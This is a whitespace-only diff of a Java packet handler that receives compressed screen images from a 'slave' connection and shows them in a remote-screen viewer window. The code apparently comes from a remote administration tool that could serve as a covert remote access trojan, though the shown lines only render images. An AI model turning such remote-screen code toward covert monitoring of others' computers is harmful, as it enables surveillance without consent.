@@ -47,14 +47,14 @@ public class Packet17RemoteScreen extends AbstractIncomingPacket {
 			itd = new RemoteScreenData(slave, w, h);
 			instances.put(slave, itd);
 		}
-		
+
 		if (itd.getBufferedImage().getWidth() != w || itd.getBufferedImage().getHeight() != h) {
 			itd = new RemoteScreenData(slave, w, h);
 			instances.put(slave, itd);
 		}
-		
+
 		BufferedImage bufferedImage = itd.getBufferedImage();
-		
+
 		FrameRemoteScreen frame = FrameRemoteScreen.instances.get(slave);
 
 		if (dis.readBoolean() && frame != null) {
@@ -67,7 +67,7 @@ public class Packet17RemoteScreen extends AbstractIncomingPacket {
 			if (requestAgain) {
 				new ThreadImage(frame.getDelay(), slave).start();
 			}
-			
+
 			frame.getFPSThread().increase();
 			return;
 		}
@@ -80,7 +80,7 @@ public class Packet17RemoteScreen extends AbstractIncomingPacket {
 		byte[] buffer = new byte[blen];
 		slave.getDataInputStream().readFully(buffer);
 		buffer = GZip.decompress(buffer);
-		
+
 		if (frame != null) {
 			try {
 				Graphics imageGraphics = bufferedImage.getGraphics();
@@ -117,7 +117,6 @@ public class Packet17RemoteScreen extends AbstractIncomingPacket {
 				frame.lbl.repaint();
 
 				frame.increaseSize(size);
-
 
 				if (!itd.hasCreatedIcon()) {
 					ImageIcon imageicon = new ImageIcon(bufferedImage);
